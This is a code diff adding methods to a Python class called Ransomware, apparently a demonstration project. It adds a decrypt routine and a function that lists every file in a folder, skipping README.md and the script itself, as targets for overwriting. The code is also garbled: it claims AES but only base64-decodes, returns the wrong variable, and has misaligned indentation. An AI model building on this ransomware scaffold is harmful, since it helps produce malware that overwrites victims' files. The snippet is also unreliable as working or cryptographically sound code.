@@ -67,3 +67,42 @@ class Ransomware:
         with open(filename, 'w') as file:
             file.write(encrypted_data.decode('utf-8'))
 
+        # Function for decrypting the file
+    def decrypt_file(self, key, filename):
+
+        """ Decrypt the given file with AES encryption algorithm.
+        :param str key: Decryption key.
+        :param str filename: Name of the file.
+        """
+
+        # Load the content of file.
+        with open(filename, 'r') as file:
+            # Read the file content
+            content = file.read()
+
+            # Decrypt the file content.
+            decrypted_data = base64.b64decode(content)
+
+                # Rewrite the file with the decoded content.
+        with open(filename, 'w') as file:
+            content = file.write(decrypted_data.decode('utf-8'))
+
+    # Function finds files in folder
+    def get_files_in_folder(self, path):
+        """ Returns a `list` of all files in the folder.
+
+        :param str path: Path to the folder
+        """
+
+        # List the directory to get all files.
+        files = []
+        for file in os.listdir(path):
+            # For the demonstration purposes ignore README.md
+            # And this script itself.
+            if file == 'README.md' or file == sys.argv[0]:
+                continue
+            file_path = os.path.join(path, file)
+            if os.path.isfile(file_path):
+                files.append(file_path)
+            
+        return file
